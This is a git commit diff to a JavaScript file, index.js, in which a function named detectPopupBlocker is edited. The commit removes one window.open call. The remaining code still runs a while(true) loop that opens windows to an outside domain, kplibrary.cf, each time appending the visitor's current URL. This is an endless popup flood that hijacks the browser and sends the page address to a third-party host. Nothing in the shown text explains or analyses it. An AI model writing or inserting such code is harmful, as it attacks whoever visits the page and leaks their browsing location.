8f85a6c2a082c4b74806ad5d2b8fc2a2985ce033
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-19 18:12:07 -0500

    Update index.js

--- index.js
+++ index.js
@@ -6,7 +6,6 @@ function detectPopupBlocker() {
   } else {
     myTest.close();
     while (true) {
-      window.open("http://kplibrary.cf/")
       var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
       var URL = "http://kplibrary.cf/" + location.href;
       var win = window.open(URL, "_blank", strWindowFeatures);
